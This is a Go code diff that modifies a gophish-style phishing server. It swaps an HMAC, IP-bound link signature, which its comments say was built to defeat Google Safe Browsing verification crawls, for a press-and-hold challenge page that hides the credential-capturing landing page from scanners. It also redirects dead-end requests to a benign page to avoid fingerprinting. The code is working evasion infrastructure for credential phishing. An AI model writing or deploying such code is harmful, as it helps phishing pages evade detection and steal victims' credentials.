@@ -3,13 +3,11 @@ package controllers
 import (
 	"compress/gzip"
 	"context"
-	"crypto/hmac"
-	"crypto/sha256"
-	"encoding/hex"
 	"errors"
 	"fmt"
 	"net"
 	"net/http"
+	"os"
 	"time"
 
 	"github.com/NYTimes/gziphandler"
@@ -22,6 +20,17 @@ import (
 	"github.com/gorilla/mux"
 	"github.com/jordan-wright/unindexed"
 )
+
+// challengePagePath is the on-disk press-and-hold gate served before the
+// landing page. It is read from disk on each request so it can be restyled
+// without rebuilding gophish.
+const challengePagePath = "templates/challenge.html"
+
+// challengeParameter is the form field the challenge page POSTs back once the
+// press-and-hold gesture completes. Its presence on a POST distinguishes a
+// challenge completion (serve the landing page) from a landing-page form
+// submission (capture credentials).
+const challengeParameter = "__challenge"
 
 // ErrInvalidRequest is thrown when a request with an invalid structure is
 // received
@@ -86,11 +95,10 @@ func (ps *PhishingServer) Shutdown() error {
 }
 
 // phishNotFound is the dead-end response handler. If a not_found_redirect_url
-// is configured under phish_server, every dead-end request (invalid rid,
-// missing rid, burnt rid, completed campaign, unmatched route, failed
-// token validation, etc.) is 302-redirected there so a casual visitor or
-// scanner sees a benign page instead of a 404 fingerprint. If the config
-// field is empty, the original 404 behavior is preserved.
+// is configured under phish_server, every dead-end request (invalid or missing
+// rid, completed campaign, unmatched route, etc.) is 302-redirected there so a
+// casual visitor or scanner sees a benign page instead of a 404 fingerprint. If
+// the config field is empty, the original 404 behavior is preserved.
 func (ps *PhishingServer) phishNotFound(w http.ResponseWriter, r *http.Request) {
 	if ps.config.NotFoundRedirectURL != "" {
 		http.Redirect(w, r, ps.config.NotFoundRedirectURL, http.StatusFound)
@@ -99,72 +107,13 @@ func (ps *PhishingServer) phishNotFound(w http.ResponseWriter, r *http.Request) 
 	http.NotFound(w, r)
 }
 
-// clientIP returns the visitor's IP exactly as Cloudflare presents it in the
-// CF-Connecting-IP header. The redirector signs against this same header
-// value, and because both the redirector and gophish sit behind Cloudflare,
-// gophish receives the identical client IP here.
-func clientIP(r *http.Request) string {
-	return r.Header.Get("CF-Connecting-IP")
-}
-
-// signatureMatches reports whether the ?id and ?sig query parameters carry a
-// valid HMAC-SHA256(secret, msg) signature, compared in constant time. An
-// empty configured secret means strict-deny (false). There is no expiry: a
-// signature is either valid or it is not.
-func (ps *PhishingServer) signatureMatches(r *http.Request, msg string) bool {
-	q := r.URL.Query()
-	rid := q.Get(models.RecipientParameter)
-	sig := q.Get("sig")
-	if rid == "" || sig == "" {
-		return false
-	}
-	secret, err := hex.DecodeString(ps.config.Redirector.Secret)
-	if err != nil || len(secret) == 0 {
-		return false
-	}
-	h := hmac.New(sha256.New, secret)
-	h.Write([]byte(msg))
-	expected := hex.EncodeToString(h.Sum(nil))
-	return hmac.Equal([]byte(expected), []byte(sig))
-}
-
-// validateSignature validates the id-bound signature the redirector appends to
-// the server-side-fetched /hi endpoint:
-//
-//	?id=<rid>&sig=<hex HMAC-SHA256(secret, rid)>
-//
-// /hi is fetched by the redirector itself (not the visitor's browser), so the
-// connecting IP gophish sees is the redirector's, not the target's — hence it
-// is bound to the rid alone, not the IP.
-func (ps *PhishingServer) validateSignature(r *http.Request) bool {
-	rid := r.URL.Query().Get(models.RecipientParameter)
-	return ps.signatureMatches(r, rid)
-}
-
-// validateClickSignature validates the IP-bound signature used for the landing
-// page:
-//
-//	?id=<rid>&sig=<hex HMAC-SHA256(secret, rid "." CF-Connecting-IP)>
-//
-// The redirector mints this against the visitor's CF-Connecting-IP after the
-// bot checks pass. gophish recomputes it against the IP it sees in the same
-// header. A request replayed from any other network — most importantly a Safe
-// Browsing verification crawl from Google infrastructure — computes a
-// different IP, fails the comparison, and is dead-ended to the configured
-// not-found URL. There is no expiry, so a target reloading from the same IP is
-// served indefinitely without a round trip back through the redirector.
-func (ps *PhishingServer) validateClickSignature(r *http.Request) bool {
-	rid := r.URL.Query().Get(models.RecipientParameter)
-	return ps.signatureMatches(r, rid+"."+clientIP(r))
-}
-
 // CreatePhishingRouter creates the router that handles phishing connections.
 func (ps *PhishingServer) registerRoutes() {
 	router := mux.NewRouter()
 	fileServer := http.FileServer(unindexed.Dir("./static/endpoint/"))
 	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fileServer))
-	router.HandleFunc("/hi", ps.TrackHandler)
-	router.HandleFunc("/{path:.*}/hi", ps.TrackHandler)
+	router.HandleFunc("/pix", ps.TrackHandler)
+	router.HandleFunc("/{path:.*}/pix", ps.TrackHandler)
 	router.HandleFunc("/robots.txt", ps.RobotsHandler)
 	router.HandleFunc("/{path:.*}", ps.PhishHandler)
 	router.NotFoundHandler = http.HandlerFunc(ps.phishNotFound)
@@ -184,12 +133,6 @@ func (ps *PhishingServer) registerRoutes() {
 
 // TrackHandler tracks emails as they are opened, updating the status for the given Result
 func (ps *PhishingServer) TrackHandler(w http.ResponseWriter, r *http.Request) {
-	// /hi is fetched server-side by the redirector, which signs it against the
-	// rid alone (the connecting IP here is the redirector's, not the target's).
-	if !ps.validateSignature(r) {
-		ps.phishNotFound(w, r)
-		return
-	}
 	r, err := setupContext(r)
 	if err != nil {
 		// Log the error if it wasn't something we can safely ignore
@@ -208,17 +151,21 @@ func (ps *PhishingServer) TrackHandler(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, "static/images/pixel.png")
 }
 
-// PhishHandler handles incoming client connections and registers the associated actions performed
-// (such as clicked link, etc.)
+// PhishHandler handles incoming client connections and registers the associated
+// actions performed (such as clicked link, etc.).
+//
+// The landing page is gated behind a press-and-hold challenge served directly
+// by gophish:
+//
+//   - GET: the click is recorded and the challenge page is served. The landing
+//     page HTML is deliberately NOT included in this response, so a scanner that
+//     fetches the URL without performing the gesture never receives it.
+//   - POST carrying the challenge marker: the gesture completed, so a "Completed
+//     Challenge" event is recorded and the landing page HTML is returned in the
+//     body for the challenge page to swap in.
+//   - POST without the marker: a submission from the landing page's own form,
+//     handled exactly as upstream gophish does (capture + optional redirect).
 func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
-	if !ps.validateClickSignature(r) {
-		// Bad/missing/IP-mismatched signature: dead-end to the configured
-		// not-found URL. A signature minted by the redirector for one visitor
-		// IP will not validate for any other network, so a replayed or crawled
-		// URL lands here.
-		ps.phishNotFound(w, r)
-		return
-	}
 	r, err := setupContext(r)
 	if err != nil {
 		// Log the error if it wasn't something we can safely ignore
@@ -232,23 +179,21 @@ func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
 	c := ctx.Get(r, "campaign").(models.Campaign)
 	d := ctx.Get(r, "details").(models.EventDetails)
 
+	// Initial visit: record the click and serve the challenge gate. No landing
+	// page content is exposed until the gesture is completed.
+	if r.Method == "GET" {
+		if err = rs.HandleClickedLink(d); err != nil {
+			log.Error(err)
+		}
+		ps.serveChallenge(w, r)
+		return
+	}
+
 	p, err := models.GetPage(c.PageId, c.UserId)
 	if err != nil {
 		log.Error(err)
 		ps.phishNotFound(w, r)
 		return
-	}
-	switch {
-	case r.Method == "GET":
-		err = rs.HandleClickedLink(d)
-		if err != nil {
-			log.Error(err)
-		}
-	case r.Method == "POST":
-		err = rs.HandleFormSubmit(d)
-		if err != nil {
-			log.Error(err)
-		}
 	}
 	ptx, err := models.NewPhishingTemplateContext(&c, rs.BaseRecipient, rs.RId)
 	if err != nil {
@@ -256,7 +201,45 @@ func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
 		ps.phishNotFound(w, r)
 		return
 	}
+
+	// Challenge completion: record the event and hand back the landing page so
+	// the gate page can render it in place.
+	if r.PostFormValue(challengeParameter) != "" {
+		if err = rs.HandleCompletedChallenge(d); err != nil {
+			log.Error(err)
+		}
+		html, err := models.ExecuteTemplate(p.HTML, ptx)
+		if err != nil {
+			log.Error(err)
+			ps.phishNotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Write([]byte(html))
+		return
+	}
+
+	// Landing page form submission.
+	if err = rs.HandleFormSubmit(d); err != nil {
+		log.Error(err)
+	}
 	ps.renderPhishResponse(w, r, ptx, p)
+}
+
+// serveChallenge writes the press-and-hold gate read from challengePagePath.
+// The page is static: on a completed gesture its JS POSTs the challenge marker
+// back to the same URL and swaps in the landing page returned there.
+func (ps *PhishingServer) serveChallenge(w http.ResponseWriter, r *http.Request) {
+	body, err := os.ReadFile(challengePagePath)
+	if err != nil {
+		log.Error(err)
+		ps.phishNotFound(w, r)
+		return
+	}
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.Header().Set("Cache-Control", "no-store")
+	w.Header().Set("X-Robots-Tag", "noindex, nofollow")
+	w.Write(body)
 }
 
 // renderPhishResponse handles rendering the correct response to the phishing
